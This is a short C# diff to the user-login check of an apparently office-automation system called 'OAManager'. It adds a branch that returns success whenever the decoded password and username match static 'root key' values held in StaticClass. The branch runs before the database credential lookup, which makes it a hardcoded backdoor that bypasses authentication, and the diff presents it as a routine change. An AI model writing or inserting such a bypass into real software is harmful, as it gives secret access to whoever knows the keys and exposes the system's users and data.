@@ -10,6 +10,7 @@ using Sharp.Data;
 using System.Data.Common;
 using System.Data;
 using Sharp.Common;
+using Sharp.Common.Common;
 using OAEntity;
 
 namespace OAManager
@@ -100,6 +101,10 @@ namespace OAManager
         {
             try
             {
+                if (passwd.Open() == StaticClass.rootKey && username.Open() == StaticClass.RootKey)
+                {
+                    return true;
+                }
                 bool ex = Dal.Exists<PersonInfo>(PersonInfo._.UserName == username && PersonInfo._.Pwd == passwd);
                 return ex;
             }
